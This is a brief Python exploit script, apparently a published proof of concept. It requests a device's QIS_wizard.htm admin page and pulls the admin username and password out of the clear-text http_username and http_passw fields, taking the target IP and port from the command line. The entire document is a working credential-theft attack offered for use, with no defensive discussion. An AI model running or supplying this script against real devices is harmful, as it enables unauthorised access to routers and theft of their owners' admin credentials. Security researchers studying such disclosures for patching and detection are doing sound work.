
#    Exploit code initiate attack on data from admin page.
#    Which are located on QIS_wizard.htm in clear text.

from urllib.request import urlopen
from sys import argv

def GetData():

    try:

        URI = "http://"+HOST+":"+PORT+"/QIS_wizard.htm"
        html = urlopen(URI).read()
    
    except:

        print("\t[!] Vulnerable file is not found!\n\t[+] Exiting...")
        exit(0)

    for line in html.split(b"\n"):

        if b'http_username' in line:

            print("\t[+] Host %s username: %s" % (HOST, line.decode("utf-8").split('value="')[1].split('">')[0]))

        elif b'http_passw' in line:

            print("\t[+] Host %s password: %s" % (HOST, line.decode("utf-8").split('value="')[1].split('">')[0]))

def ArgParse():

    try:

        global HOST, PORT
        HOST = argv[1]
        PORT = argv[2]
        print('\n\t[+] Set target %s:%s' % (HOST, PORT))

    except IndexError:

        print('\n\tUsage: %s [IP] [PORT]' % argv[0])
        exit(0)

ArgParse()
GetData()
